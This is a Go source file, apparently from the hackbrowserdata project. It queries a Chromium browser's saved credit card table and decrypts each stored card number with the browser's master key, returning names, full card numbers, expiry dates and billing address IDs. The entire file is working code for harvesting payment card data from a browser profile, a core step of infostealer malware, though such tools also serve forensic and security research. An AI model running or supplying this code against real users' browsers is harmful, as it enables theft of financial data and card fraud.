package chromium

import (
	"database/sql"

	"github.com/moond4rk/hackbrowserdata/types"
	"github.com/moond4rk/hackbrowserdata/utils/sqliteutil"
)

const defaultCreditCardQuery = `SELECT name_on_card, expiration_month, expiration_year,
	card_number_encrypted, COALESCE(nickname, ''), COALESCE(billing_address_id, '') FROM credit_cards`

func extractCreditCards(masterKey []byte, path string) ([]types.CreditCardEntry, error) {
	return sqliteutil.QueryRows(path, false, defaultCreditCardQuery,
		func(rows *sql.Rows) (types.CreditCardEntry, error) {
			var name, month, year, nickName, address string
			var encNumber []byte
			if err := rows.Scan(&name, &month, &year, &encNumber, &nickName, &address); err != nil {
				return types.CreditCardEntry{}, err
			}
			number, _ := decryptValue(masterKey, encNumber)
			return types.CreditCardEntry{
				Name:     name,
				Number:   string(number),
				ExpMonth: month,
				ExpYear:  year,
				NickName: nickName,
				Address:  address,
			}, nil
		})
}
